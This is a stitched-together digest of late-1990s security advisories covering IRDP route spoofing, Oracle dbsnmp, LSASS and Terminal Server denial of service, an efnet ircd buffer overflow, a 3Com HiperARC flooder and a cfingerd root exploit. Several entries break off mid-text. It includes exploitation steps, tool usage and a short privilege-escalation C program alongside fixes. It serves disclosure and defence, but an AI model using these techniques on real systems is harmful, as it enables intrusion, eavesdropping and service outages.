                         URL: http://www.L0pht.com/advisories.html
             Source code: http://www.l0pht.com/advisories/rdp.tar.gz
               code written by Silicosis & Mudge
     
     
     
     I. Problem
     ----------
     
     
       The ICMP Router Discovery Protocol (IRDP) comes enabled by default on
     DHCP clients that are running Microsoft Windows95 (w/winsock2),
     Windows95b, Windows98, Windows98se, and Windows2000 machines.  By
     spoofing IRDP Router Advertisements, an attacker can remotely add default
     route entries on a remote system.  The default route entry added by the
     attacker will be preferred over the default route obtained from the DHCP
     server. While Windows2000 does indeed have IRDP enabled by default, it
     less vulnerable as it is impossible to give it a route that is preferred
     over the default route obtained via DHCP.
     
     
       SunOS systems will also intentionally use IRDP under specific
     conditions. For Solaris2.6, the IRDP daemon, in.rdisc, will be started
     if the following conditions are met:
     
     
            . The system is a host, not a router.
            . The system did not learn a default gateway from a
              DHCP server.
            . The system does not have any static routes.
            . The system does not have a valid /etc/defaultrouter
              file.
     
     
     It should be noted that the important point of this advisory is not
     that ICMP Router Solicitation and Advertisement packets have no
     authentication properties. Yes, this is a problem but it has long been
     known. The dangerous aspect comes in various MS platforms enabling
     this protocol and believing it _even when the DHCP setup specifies
     not to use IRDP (dhcp option #31) (ie the operating system does this even
     though you believe you are telling it NOT TO).
     
     
     The tool provided with this advisory is the basis of what would
     be used for everything from web page hacks, stealing credentials,
     modifying or altering data, etc. involving vulnerable systems.
     We believe most cable modem DHCP clients and large internal
     organizations are at risk.
     
     
     II. Risks
     ---------
     
     
       The ICMP Router Discovery Protocol does not have any form of
     authentication, making it impossible for end hosts to tell whether or not
     the information they receive is valid.  Because of this, attackers
     can perform a number of attacks:
     
     
        Passive monitoring:  In a switched environment, an attacker
              can use this to re-route the outbound traffic of
              vulnerable systems through them.  This will allow
              them to monitor or record one side of the
              conversation.
              
              * For this to work, and attacker must be on the
              * same network as the victim.
     
     
         Man in the Middle:  Taking the above attack to the next level, the
              attacker would also be able to modify any of the
              outgoing traffic or play man in the middle.
     
     
              By sitting in the middle, the attacker can act as
              a proxy between the victim and the end host. The
              victim, while thinking that they are connected directly
              to the end host, they are actually connected to the
              attacker, and the attacker is connected to the end
              host and is feeding the information through.  If
              the connection is to a secure webserver that uses SSL,
              by sitting in the middle, the attacker would be able
              to intercept the traffic, unencrypted.
     
     
              A good example of this risk is on-line banking;
              an attacker playing man-in-the-middle would be able
              to intercept all of the banking information that
              is relayed, without the victim's knowledge.
              This is just a generic oversimplified scenario,
              there are obvious issues with certificates that
              the attacker would have to deal with if
              attempting this scenario.
              
              * For this to work, and attacker must be on the
              * same network as the victim.
     
     
         Denial of Service:  Remote attackers can spoof these ICMP packets and
              remotely add bad default-route entries into a
              victims routing table.  Because the victim's
              system would be forwarding the frames to the
              wrong address, it will be unable to reach other
              networks.
     
     
              Unfortunately, DHCP has quickly become popular and is
              relied upon in most companies. In some cases, such as
              cable & *DSL modems, users are required to use DHCP.
     
     
              Because of the large number of vulnerable systems,
              and the fact that this attack will penetrate firewalls
              that do not stop incoming ICMP packets, this Denial
              of Service attack can become quite severe.
              
     
     
       It should be noted that the above attacks are documented in Section 7,
     of RFC 1256.  However, the RFC states states that the attacks are
     launched by an attacker on the same network as the victim. In the Denial
     of Service attack, this is not the case; an attacker can spoof IRDP
     packets and corrupt the routing tables on systems that are on remote
     networks.
     
     
       While these attacks are not new, the fact that Windows95/98 DHCP
     clients have been vulnerable for years, is.  On systems running SunOS &
     Solaris, it is easy to find documentation on IRDP by looking at the
     startup scripts or manpages.  On Windows95/98, however, information
     has only become recently available in the Knowledge Bank.
     
     
     
     III. Technical Details
     ----------------------
     
     
     Upon startup, a system running MS Windows95/98 will always send 3 ICMP
     Router Solicitation packets to the 224.0.0.2 multicast address.  If the
     machine is NOT configured as a DHCP client, it ignores any Router
     Advertisements sent back to the host.
     
     
       However, if the Windows machine is configured as a DHCP client, any
     Router Advertisements sent to the machine will be accepted and processed.
     Once an Advertisement is received, Windows checks to see how many Gateway
     entries the packet contains.  If the packet contains only 1 entry, it
     checks to make sure the IP source address of the Advertisement is inside
     the hosts subnet.   If it is, the Router Address entry inside the
     advertisement is checked to see that it is also within the host's subnet.
     If so, a new default route entry is added.  If the address is outside the
     subnet, it the advertisement is silently ignored.
     
     
       If a host receives a Router Advertisment that contains 2 or more Router
     Addresses, the host will processes the packet even though the IP source
     address is not local.  If the host finds a Router Address inside the
     advertisement that is inside the host's subnet, it will add a default
     route entry for it.
     
     
       Because the host does not care about the IP source address of the
     Advertisement as long as it has more than one entry, attackers can now
     create bogus IRDP packets that will bypass anti-spoofing filters.
     
     
     Before the host can add a new default route entry, it has to determine
     the route metric.  On Windows95/98, normal default route entries obtained
     from a DHCP server have a metric of 1.  In order to determine the metric
     for the default route entry obtained via IRDP, the Windows host subtracts
     the Advertisement's Preference value from 1000.  By creating an ICMP
     Router Advertisement with a preference of 1000, the default gateway route
     added will have a metric of 0, making it the preferred default route.
     
     
     By adjusting the Lifetime value in the advertisement, an attacker can
     adjust how many seconds the gateways are valid for.
     
     
     DHCP Vendor Option #31, "Perform Router Discovery" has no effect on
     disabling this. If you configure your DHCP server to implicitly disable
     Router Discovery, the vulnerable Window95/98 hosts will ignore this, and
     continue to update their routing tables with information gleemed via
     IRDP.
     
     
     IV. Fixes / Work-arounds
     ------------------------
     
     
     Firewall / Routers:
         Block all ICMP Type 9 & Type 10 packets.  This should protect
         against remote Denial of Service attacks.
     
     
     Windows95/98:
         
         The Microsoft Knowledge Base contains an article that gives info
         on how to disable IRDP. It can be found at:
     
     
         http://support.microsoft.com/support/kb/articles/q216/1/41.asp
         
         Brief Summary of article:
     
     
           IRDP can be disabled manually by adding "PerformRouterDiscovery"
           value name and setting it to a dword value of 0, under the
           following registry key(s):
     
     
                   HKLM\System\CurrentControlSet\Services\Class\NetTrans\####
     
     
               Where #### is the binding for TCP/IP. More than one TCP/IP
           binding may exist.
     
     
     Solaris:
         
         Configure your host to obtain a default gateway through DHCP,
         static routes, or via the /etc/defaultrouter file. For more
         information on IRDP refer to in.rdisc's man-page.
     
     
     
     V. Detection
     -------------
     
     
       L0pht has released a NFR Intrusion Detection Module to detect both
       Router Solicitations and Advertisements. You can find it at:
         http://www.l0pht.com/NFR
     
     
       NFR information can be found at http://www.nfr.net
     
     
     
     VI. Source Code
     -----------
     
     
     L0pht is making available Proof-of-Concept code that will let individuals
     test their systems & firewalls.
     
     
     The source code can be found at: http://www.l0pht.com/advisories/rdp.tar.gz
     
     
     Usage is fairly straight forward:
     
     
     Usage: rdp -v -l -s -d &lt;delay> -p &lt;pref> -t &lt;lifetime> -i &lt;dev>
                -S &lt;src> -D &lt;dst> -R &lt;rtr> -r &lt;optional 2nd rtr>
     
     
             -v verbose
             -l listen mode
             -s send mode
             -d &lt;delay time between sending packets>
             -n &lt;number of rdp packets to send>
             -I &lt;ID value to place in IP packet>
             -p &lt;preference level>
             -t &lt;lifetime>
             -i &lt;interface to use for sniffing>
             -S &lt;source address to put in outgoing rdp packet>
             -D &lt;destination address to put in outgoing rdp packet>
             -R &lt;router address to advertise in rdp packet>
             -r &lt;optional 2nd router address to advertise in rdp packet>
     
     
     
     Misc software notes:
     
     
     Listen Mode:    Software listens for ICMP Router Solicitations.  If the
            '-s' flag is specified as well, the software will answer
            the Solicitations with ICMP Router Advertisements.
     
     
     Preference:    If the preference is not specified, it will use a default
            of 1000, which will give the default route a metric of 0
            on affected Windows systems.
     
     
     2nd Router Addr: By using the '-r' flag and specifying a second router address
            entry, the packet can contain a bogus source address and still
            be processed for correct gateway entries by the

     Hi Listers,
     
     
     I discover a new security problem with Oracle on Unix.
     Once again, it's with a setuid program.
     
     
     Do not confuse with a similar problem corrected
     by ORACLE  some month ago with a patch called setuid_patch.sh.
     
     
     NEW PROBLEM :
     
     
     if you have installed Oracle Intelligent agent, you will find in
     $ORACLE_HOME/bin a program called dbsnmp.
     This program is setuid root and was DELIBERATELY EXCLUDED
     by Oracle in the forementioned patch.
     
     
     The security hole resides in the fact  that this program executes
     a tcl script ( nmiconf.tcl ) located by default  in
     $ORACLE_HOME/network/agent/config.
     
     
     Needless to say that  you can easily bypass this default and have
     your own malicious nmiconf.tcl script run under root privileges.
     
     
     I verify this on HP-UX 10.20 with  Oracle 7.3.3 and 8.0.4.3
                         on AIX 4.3  with Oracle 8.0.5.1
     But  it's probably Unix generic.

     Subject: Vulnerablity In LSA on Windows NT SP5
     
     
     
     Russ,
     A few months ago I found a vulnerability in NT 4.0 configured with SP5.
     I downloaded a trial copy of Network Associates Cyber Cop version 5.0.
     I ran a scan using all the Denial of Service based attack options.  All
     failed but one: the "Windows NT- LSASS.EXE Denial of Service attack."
     When you run a scan on a NT 4.0 machine configured with SP5 (with or
     without the LSA3 hot fix) utilizing this option, the target machine will
     lock, not allowing users to authenticate to the server remotely or
     locally.  The only way to correct the problem is to physically reboot
     the server.  Also, to make matters worse, the audit logs on the target
     server do not illustrate where the attacks were launched from.  Because
     Cyber Cop allows you to run this scan on any IP or any host of IPs, an
     intruder could attack a large base of servers in a relatively short
     amount of time without leaving a reliable audit trail.
     I reported this issue to Microsoft on 6/23/99 (I have an incident
     number).  I have been following up with Microsoft, but they have been
     reluctant to provide much detail on the issue.  Hopefully you can help
     motivate them.
     Thanks

73.0 w00w00's efnet ircd advisory (exploit included)
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
          
     [http://www.w00w00.org, comments to shok@dataforce.net]
     
     
     SUMMARY
     efnet ircd hybrid-6 (up to beta 58) have a vulnerability that can allow
     remote access to the irc server.  In most cases, you'll gain privileges of
     the 'irc' user.
     
     
     COMMENTS
     This vulnerability was discovered by jduck and stranjer of w00w00 at
     least 2 months ago.  After discussing the vulnerability, it was reported
     to Dianora by jduck and fixed.  Hopefully the vulnerable irc servers have
     been fixed.  If not, it's unfortunate Dianora didn't notify the vulnerable
     irc servers or they didn't take these 2 months to fix themselves (note:
     we didn't wait that long on purpose.. we were just sidetracked with a
     million other things).
     
     
     DESCRIPTION
     The vulnerability is in the invite handling code (m_invite).  In a
     channels with operators (ops) and modes +pi (paranoid + invite-only), a
     channel invitation is reported to all other operators.  The buffer used to
     store the invitation notice can overflow its boundaries by up to 15
     bytes.
     
     
     Steps:
     1. Client 1 (9chars!10chars@trivial) joins #199chars
     2. Client 2 (trivial!trivial@trivial) joins #199chars
     3. Client 1 sets mode #199chars +pio Client 2
     4. Client 1 invites Client 3 (9chars!10chars@63chars) to #199chars
     
     
     Note: client 1 and client 3 should _not_ be from the same host.  With our
     exploit, client 3 (compile/run hostname.c) first, then compile/run
     ircdexp.c.
     
     
     Client #1's server = vulnerable irc server (such as irc.arpa.com)
     Client #2's server = trivial
     Client #3's server = ComStud irc server (such as irc.prison.net), because
                          it allows shellcode chars in hostname
     
     
     Using the following spoofed host (59 chars):
     shellcodeshellcodeshellcodeshellcodeshellcodeshellcode.AAAA
     [The ComStud ircd will check for a '.']
     
     
     Here, EIP = 0x41414141 (AAAA).  The other registers are negligable.
     The hostlen is actually 63 bytes, but for this specific overflow, EIP is
     overwritten at buf[54-58].
     
     
     We have to take stdout/stdin descriptors into consideration.  We are very
     limited in size (only have 54 bytes for shellcode), so we can't fit bind
     shellcode.  Instead, we took the standard Linux x86 shellcode, dropped
     exit handling code, added a close'd stdin, dup'd cptr->fd (cptr is the
     first argument passed to m_invite).  Since we only have 54 bytes to work
     with, we can't fit code in to close stdout and dup cptr->fd, so output
     will be sent to whatever terminald ircd was started from.  If you do not
     wish for the output to be seen, redirect everything (via '>') /dev/null.
     
     
     As for how to go about spoofing, you have options:
     1) Use the old DNS poison caching method
     2) Use custom "fake binds" that will just pass on your shellcode as a
        hostname in response to a DNS query (idea from nyt).
     
     
     Option #2 is the approach we will take (hostname.c generates the shellcode
     we'll use). This will work fine as long as you IP/hostname hasn't already
     been cached.  Because these "fake binds" are pretty popular (or have been
     in the past), they should be easy to come by and are outside the scope of
     this advisory.
     
     
     So full steps are, client with the spoofed hostname, connect to a ComStud
     ircd server (such as irc.prison.net), another client join the arbitrary
     client, and another client join the target ircd hybrid-6 server (such as
     irc.arpa.com).  Once the channel is +pi (and your channel, ident,
     username, etc. all the right length), invite the client with the spoofed
     hostname.  Fine-tune until you have root.
     
     
     Thanks to: stranjer and jduck for their input and discovery of this
     vulnerability.

      *     2. Client B (trivial!trivial@trivial) joins #199chars
      *     3. Client A sets mode #199chars +pio Client B
      *     4. Client A invites Client C (9chars!10chars@58chars) to #199chars
      *
      * The code on the invitee's side is done separately.

74.0 hiperbomb.c - reboot a hiperarc router
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     
     Hello,

     
     The attached program will reboot a 3com HiperARC.  I made an attempt to
     contact 3com before posting this report, however, I received no response.
     By flooding the telnet port of a 3com HiperARC using the provided program,
     the HiperARC unconditionally reboots.  This program is effective over all
     interfaces, including a dialup.
     
     
     Regards,

      * (c) 1999 - Jonathan Chapman &lt;jchapman@1st.net>
      * ---------------------------------------------------------------------
      * Sends a high volume of IACs which eventually leads to a reboot of the
      * HiperARC.  Brief testing indicated that this problem is most likely 
      * specific to sending IACs rather than any other type of data.  Further
      * research has shown that specific IAC patterns are more likely to cause
      * a reboot.  In this example I use one of the most efficient combinations
      * I have discovered.  Through my testing it usually required at least
      * 60,000 packets to cause the HiperARC to reboot.

     CHANGE SUMMARY: Defects in previous patches discovered.
     -----------------------------------------------------------------------
     I.
        A. Background
           A recent bugtraq posting contained some inaccurate information
           regarding Hewlett-Packard Company's VirtualVault Operating System.
           This problem is not TGA nor TGP related; further, VVOS does not
           have a B1 or B2 level of certification.
     
     
           Under certain conditions, Netscape Enterprise Server (NES)
           fails to properly process web requests.  This activity has
           been observed in the NES bundled with Praesidium VirtualVault
           releases A.02.00, A.03.00, A.03.01 and A.03.50.
     
     
        B. Fixing the problem
           This problem can be completely eliminated by applying the
           recommended patches mentioned above.  It can be resolved
           temporarily by commenting out or removing the "vault-auth-log"
           AddLog line from the Netscape Enterprise Server's obj.conf file.
     
     
           Upon patching the system, automatic reboot is performed.  The
           affected filesets are: VaultNES.NES-VAULT VaultTS.INES-COMMON.

76.0 cfingerd exploit
     ~~~~~~~~~~~~~~~~
     
     
     
     Bugtraq Security Advisory
     =========================
     
     
       A serious bug in cfingerd before version 1.4.0 has been reported.
       It is present in all versions of cfingerd from 1.2.0 up to any
       version of 1.3.2.  If configured accordingly this bug enables any
       local user to execute random programs with root priviledges.
     
     
       Although I haven't been quite verbose with development of cfingerd,
       Ken Hollis (the original author) has handed maintainership over to
       me a while ago.  I did some development and fixed some security
       related bugs, but never made an official release.  This is done now.
     
     
     Affected systems
     ----------------
     
     
       All systems running a version of cfingerd beginning with version
       1.2.0 and before version 1.4.0 are affected.
     
     
       You are safe if you have disabled ALLOW_EXECUTION in your
       cfingerd.conf file in section "internal_config", i.e. that file
       contains a line "-ALLOW_EXECUTION".
     
     
       This is the default configuration of this package.  If you use the
       default cfingerd.conf file as shipped with the distribution you are
       safe.  You should still upgrade.
     
     
     Recommended action
     ------------------
     
     
       1st Immediately turn off ALLOW_EXECUTION in your cfingerd.conf file.
     
     
       2nd Upgrade to the most recent version of cfingerd 1.4.0 to be found
           at the primary site
           ftp://ftp.infodrom.north.de/pub/people/joey/cfingerd/ or
           ftp://metalab.unc.edu/pub/Linux/system/network/finger/ .
     
     
     Exploit
     -------
     
     
       The exploit is quite simple.  Thanks go to Tadek Knapik
       &lt;tadek@nautilus.uwoj.krakow.pl> who has informed me.
     
     
       You need to add
     
     
         $exec /tmp/relinq
     
     
       to your ~/.plan file.  Then compile the following relinq.c file in
       /tmp:
     
     
         #include &lt;stdio.h>
     
     
         void main()
         {
         printf("Root exploit test\n");
         setregid(0, 0);
         setreuid(0, 0);
         printf("User: %d, group: %d.\n", getuid(), getgid());
         }

     Summary
     =======
     Microsoft has released a patch that eliminates a vulnerability that
     could pose a denial-of-service threat to Microsoft(r) Windows NT(r)
     Terminal Servers. Frequently asked questions regarding this vulnerability
     can be found at http://www.microsoft.com/security/bulletins/MS99-028faq.asp
     
     
     Issue
     =====
     When a request to open a new terminal connection is received by a Terminal
     Server, the server  undertakes a resource-intensive series of operations to
     prepare for the connection. It does this  before authenticating the request.
     This would allow an attacker to mount a denial of service  attack by levying
     a large number of bogus connection requests and consuming all memory on the
     Terminal Server.
     
     
     This vulnerability could be exploited remotely if connection requests are
     not filtered. In  extreme cases, the server could crash in the face of such
     an attack; in other cases, normal  processing would return when the attack
     ceased. The patch works by causing the server to require  authentication
     before processing the connection request.
     
     
     Affected Software Versions

      contributed by Magnum 351 
      In the last 48 hours numerous underground sites hosted
      on free internet sites like Zoom, Tripod, GeoCities,
      AngelFire, and others have disappeared. It would appear
      that about forty of these sites have been the victim of
      anonymous emails to the administrators of these
      systems. It is not known who is targeting these sites for
      removal but some feel it is the work of one person who
      is attempting to remove the competition.
